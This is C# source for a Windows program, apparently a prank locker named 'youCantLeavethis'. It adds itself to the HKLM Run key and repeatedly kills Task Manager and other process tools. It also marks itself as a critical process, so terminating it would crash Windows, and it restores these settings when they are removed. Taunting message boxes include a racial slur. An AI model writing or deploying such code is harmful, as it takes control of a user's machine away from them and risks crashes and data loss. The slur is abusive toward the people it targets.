using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace youCantLeavethis

{
    internal static class Program
    {
        /// <summary>
        /// Główny punkt wejścia dla aplikacji.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            check_if_running();
            new Thread(loop_kill).Start();
            startup();
            Process.EnterDebugMode();
            make_process_critical();
            new Thread(check_reg).Start();
            new Thread(check_process_status).Start();
            Application.Run(new youCantLeavethis());
        }


        // importy bibliotek

        /* RtlSetProcessIsCritical
         * 
         * Parameters:
         * 
           The bNew argument is the desired new setting for whether the current process is critical.
           The pbOld argument provides the address of a variable that is to receive the old setting. This argument can be NULL to mean that the old setting is not wanted.
           The bNeedScb argument specifies whether to require that system critical breaks be already enabled for the current process.
         */

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlSetProcessIsCritical(bool bNew, out bool pbOld, bool bNeedScb);

        /* IsProcessCritical
         * 
         * Parameters:
         * 
           hProcess [in] - A handle to the process to query. The process must have been opened with PROCESS_QUERY_LIMITED_INFORMATION access.
           Critical [out] - A pointer to the BOOL value this function will use to indicate whether the process is considered critical.
         */

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsProcessCritical(IntPtr hProcess, out bool IsCritical);

        private static Thread current_thread = Thread.CurrentThread;

        public static void make_process_critical()
        {
            bool last_setting;
            RtlSetProcessIsCritical(true, out last_setting, false);
        }

        public static void make_process_not_critical()
        {
            bool last_setting;
            RtlSetProcessIsCritical(false, out last_setting, false);
        }

        public static bool check_if_critical_process()
        {
            Process process = Process.GetCurrentProcess();
            bool isCritical;
            IsProcessCritical(process.Handle, out isCritical);
            return isCritical;
        }

        public static void startup()
        {
            RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("CET", Application.ExecutablePath, RegistryValueKind.String);
            reg.Close();
            reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\CET", true);
            reg.SetValue("state", "asiodhasiudgiu", RegistryValueKind.String);
            reg.Close();

        }

        static private void loop_kill()
        {
            while (true) {
                string[] to_kill = { "ProcessHacker", "taskmgr", "tasklist", "taskkill" };

                foreach (string process in to_kill)
                {
                    foreach (Process proc in Process.GetProcessesByName(process))
                    {
                        proc.Kill();
                        MessageBox.Show($"{process} really?? i expected more from you.");
                    }
                }
                Thread.Sleep(20);
            }
        }

        static private bool first_start()
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\CET", true);
            var state = reg.GetValue("state");
            reg.Close();
            if (state == null) {
                return true;
            } 
            
            else
            {
                return false;
            }
        }

        private static bool is_running_r = true;

        static private void check_reg()
        {
            while (is_running_r)
            {
                RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                if (reg.GetValue("CET") == null || reg.GetValue("CET").ToString() != Application.ExecutablePath)
                {
                    reg.Close();
                    startup();
                    MessageBox.Show("Alright this is a good try but not good enough :(");
                }
                reg.Close();
                Thread.Sleep(200);
            }
        }

        static private void stop_checking_reg()
        {
            is_running_r = false;
        }

        private static bool is_running_p = true;

        static private void check_process_status()
        {
            while (is_running_p) {
                if (!check_if_critical_process())
                {
                    MessageBox.Show("Damn you're very very i mean VERY good but still i dont think you can beat me :P");
                    make_process_critical();
                }
                Thread.Sleep(200);
            }
        }

        private static void stop_checking_proc()
        {
            is_running_p = false;
        }

        private static void check_if_running()
        {
            int count = 0;

            foreach(Process process in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName))
            {
                if (count == 1)
                {
                    MessageBox.Show("Nigga its already running");
                    Process.GetCurrentProcess().Kill();
                }
                count++;
            }
        }

        static public void fix()
        {
            stop_checking_reg();
            RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.DeleteValue("CET");
            reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\CET", true);
            reg.DeleteValue("state");
            reg.Close();
            stop_checking_proc();
            make_process_not_critical();
            Process.GetCurrentProcess().Kill();
        }
    }
}
